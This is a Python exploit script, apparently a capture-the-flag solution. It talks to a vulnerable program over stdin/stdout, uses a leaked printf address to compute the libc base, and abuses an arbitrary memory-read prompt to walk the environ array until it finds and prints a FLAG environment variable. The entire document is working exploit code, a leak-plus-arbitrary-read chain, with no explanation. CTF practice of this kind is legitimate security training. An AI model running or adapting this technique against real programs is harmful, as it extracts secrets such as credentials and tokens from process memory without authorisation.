import os,sys,time,re,select
PRINTF_OFF=0x60100
ENVIRON_OFF=0x20ad58
buf=b""
def feed(to=5):
    global buf; end=time.time()+to
    while time.time()<end:
        r,_,_=select.select([0],[],[],0.3)
        if r:
            d=os.read(0,4096)
            if not d: break
            buf+=d
        else:
            if buf: break
    return
def until(sub,to=5):
    global buf; end=time.time()+to
    while sub.encode() not in buf and time.time()<end:
        r,_,_=select.select([0],[],[],0.3)
        if r:
            d=os.read(0,4096)
            if not d: break
            buf+=d
    return
def rd(addr):
    global buf
    until("read:")
    # clear buffer up to prompt
    idx=buf.rfind(b"read:"); buf=buf[idx+5:]
    os.write(1,(format(addr,'x')+"\n").encode())
    # read the hex value line
    end=time.time()+5
    while b"\n" not in buf and time.time()<end:
        r,_,_=select.select([0],[],[],0.3)
        if r:
            d=os.read(0,4096)
            if not d: break
            buf+=d
    line=buf.split(b"\n")[0].strip()
    buf=buf[buf.find(b"\n")+1:] if b"\n" in buf else b""
    m=re.search(rb"([0-9a-fA-F]+)",line)
    return int(m.group(1),16) if m else 0
# 1. get printf leak
until("printf @")
until("\n")
m=re.search(rb"printf @ (0x[0-9a-fA-F]+)",buf)
leak=int(m.group(1),16)
base=leak-PRINTF_OFF
environ=base+ENVIRON_OFF
sys.stderr.write("leak=%x base=%x environ=%x\n"%(leak,base,environ))
envp=rd(environ)
sys.stderr.write("envp=%x\n"%envp)
flagaddr=None
for i in range(80):
    p=rd(envp+8*i)
    if p==0: break
    w=rd(p)
    bs=w.to_bytes(8,'little')
    if bs.startswith(b"FLAG="):
        flagaddr=p; break
if flagaddr is None:
    sys.stderr.write("FLAG not found\n"); sys.exit(1)
data=b""
a=flagaddr
for j in range(12):
    w=rd(a+8*j)
    data+=w.to_bytes(8,'little')
    if b"\0" in data: break
data=data.split(b"\0")[0]
# strip FLAG=
flag=data[5:].decode('latin1')
sys.stderr.write("RAWENV=%r\n"%data)
sys.stderr.write("WIMP2FLAG=%s\n"%flag)
